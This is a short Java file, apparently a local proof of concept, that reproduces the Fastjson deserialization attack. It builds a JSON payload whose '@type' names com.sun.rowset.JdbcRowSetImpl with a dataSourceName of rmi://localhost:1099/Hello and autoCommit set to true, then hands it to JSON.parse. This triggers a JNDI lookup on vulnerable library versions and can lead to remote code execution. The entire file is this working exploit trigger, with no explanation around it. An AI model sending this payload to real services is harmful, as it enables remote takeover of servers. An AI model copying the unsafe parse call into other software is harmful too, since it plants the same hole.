package fastjson;

import com.alibaba.fastjson.JSON;

public class fastjs_unser {
    public static void main(String[] args) {
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","+
                "\"dataSourceName\":\"rmi://localhost:1099/Hello\","+
                "\"autoCommit\":true}";
        JSON.parse(payload);
    }
}
